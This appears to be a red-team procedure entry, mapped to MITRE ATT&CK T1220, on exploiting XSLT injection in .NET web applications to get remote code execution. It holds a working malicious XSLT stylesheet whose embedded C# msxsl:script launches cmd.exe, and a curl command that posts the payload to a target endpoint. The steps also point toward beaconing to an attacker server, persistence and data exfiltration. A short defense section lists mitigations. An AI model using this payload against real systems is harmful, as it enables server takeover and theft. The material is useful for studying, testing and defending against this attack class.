---
id: dadae9c9-4ed9-4465-86f5-e095ad1cb528
name: Native-DotNET-XSLT-Injection-RCE
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:41.609783+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/XSL Script Processing|T1220 - XSL Script Processing]]'
sub_techniques: []
tags:
  - '[[tags/Exploit]]'
  - '[[tags/Remote Code Execution with Native .NET]]'
  - '[[tags/XSLT Injection]]'
commands:
  - '[[commands/curl-inject-xslt-xml]]'
platforms:
  - Windows
  - Web
tools: []
validated: true
---

# Native-DotNET-XSLT-Injection-RCE

## Summary

This procedure demonstrates how to exploit XSLT injection vulnerabilities in .NET web applications that process XML data with XSLT stylesheets, allowing arbitrary C# code execution on the server. By injecting a malicious XSLT stylesheet containing embedded msxsl:script blocks, an attacker can execute system commands like spawning a command shell, bypassing typical input sanitization and achieving remote code execution without external dependencies.

## Description

XSLT Injection targets applications that dynamically apply user-controlled XSLT transformations to XML inputs, often for rendering data as HTML. In .NET environments using System.Xml.Xsl, attackers can inject <msxsl:script> elements with C# code that executes during transformation. This technique leverages native .NET libraries for execution, making it stealthy as it avoids external binaries. The attack is effective against legacy or misconfigured ASP.NET apps handling XML/XSLT for reports or data displays. Success leads to server-side code execution, enabling further compromise like data exfiltration or lateral movement. Prerequisites include identifying an endpoint that accepts and processes XML with XSLT, typically via POST requests.

## Requirements

1. Access to a vulnerable .NET web application endpoint that processes user-supplied XML and applies XSLT transformations.
2. Knowledge of the XML structure expected by the application to craft a valid injection payload.
3. Network access to send HTTP requests (e.g., via browser or tools like curl).
4. Basic understanding of XSLT and C# scripting within msxsl namespaces.

## Defense

- Implement strict input validation and sanitization to strip or escape XSLT-specific tags like <xsl:stylesheet> and <msxsl:script> from user inputs.
- Use parameterized XML processing and disable script execution in XSLT processors by setting XslCompiledTransform.AllowScript = false.
- Apply least privilege principles to the application pool identity, limiting it to non-interactive accounts without shell access.
- Regularly monitor application logs for anomalous XML processing errors or unexpected process spawns (e.g., cmd.exe from w3wp.exe).
- Employ web application firewalls (WAFs) with rules detecting XSLT injection patterns.

## Objectives

1. Inject a malicious XSLT stylesheet into an XML processing endpoint.
2. Execute arbitrary C# code on the server during XSLT transformation.
3. Achieve remote code execution, such as spawning a command shell.
4. Verify execution and potentially establish persistence or exfiltrate data.

## Instructions

### Step 1: Identify Vulnerable Endpoint

**Context**: Locate an application endpoint that accepts XML input and applies XSLT transformation, such as a data export or rendering feature. Test for injection by submitting malformed XML to check if XSLT errors are reflected.

Use reconnaissance tools or manual testing to confirm the endpoint (e.g., /api/render or similar). No specific command here; observe responses for XSLT processing indicators like transformation errors.

### Step 2: Craft Malicious XSLT Payload

**Context**: Create an XML document embedding the malicious XSLT stylesheet. The stylesheet includes an <msxsl:script> block with C# code that executes a command (e.g., starting cmd.exe) when the transformation calls a function like ToShortDateString.

Embed the payload using [[codes/Malicious-XSLT-for-DotNET-RCE]]:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:App="http://www.tempuri.org/App">
    <msxsl:script implements-prefix="App" language="C#">
      <![CDATA[
        public string ToShortDateString(string date)
          {
              System.Diagnostics.Process.Start("cmd.exe");
              return "01/01/2001";
          }
      ]]>
    </msxsl:script>
    <xsl:template match="ArrayOfTest">
      <TABLE>
        <xsl:for-each select="Test">
          <TR>
          <TD>
            <xsl:value-of select="App:ToShortDateString(TestDate)" />
          </TD>
          </TR>
        </xsl:for-each>
      </TABLE>
    </xsl:template>
  </xsl:stylesheet>
```

Wrap this in a valid XML structure matching the application's expected input, e.g., <ArrayOfTest><Test><TestDate>2023-01-01</TestDate></Test></ArrayOfTest>, but replace the root with the stylesheet for injection.

**Expected Output**: The payload is ready as a string or file for submission.

### Step 3: Inject Payload via HTTP Request

**Context**: Submit the crafted XML containing the malicious XSLT to the vulnerable endpoint using an HTTP POST request. This triggers the server to process and transform the input, executing the embedded C# code.

**Command** ([[commands/curl-inject-xslt-xml]]):
```bash
curl -X POST -H "Content-Type: application/xml" -d "@malicious.xml" http://target.com/api/render
```

> This sends the XML payload to the endpoint. Replace @malicious.xml with the file containing the injected XSLT. The -d flag passes the XML body, and Content-Type ensures proper parsing.

**Expected Output**: HTTP 200 OK with transformed HTML (or error if transformation fails), but no direct output from the executed command since it's server-side.

### Step 4: Verify Execution

**Context**: Confirm RCE by checking for side effects of the injected code, such as a new cmd.exe process on the server or network callbacks if modified.

Monitor server processes remotely if possible (e.g., via existing access) or modify the payload to beacon (e.g., HTTP request to attacker server). Look for cmd.exe spawn in task manager or logs.

**Expected Output**: Evidence of command execution, like a shell window or log entry showing Process.Start.

**Success Indicators**:
- Server logs show XML transformation with script execution.
- Anomalous processes (e.g., cmd.exe) appear on the target system.
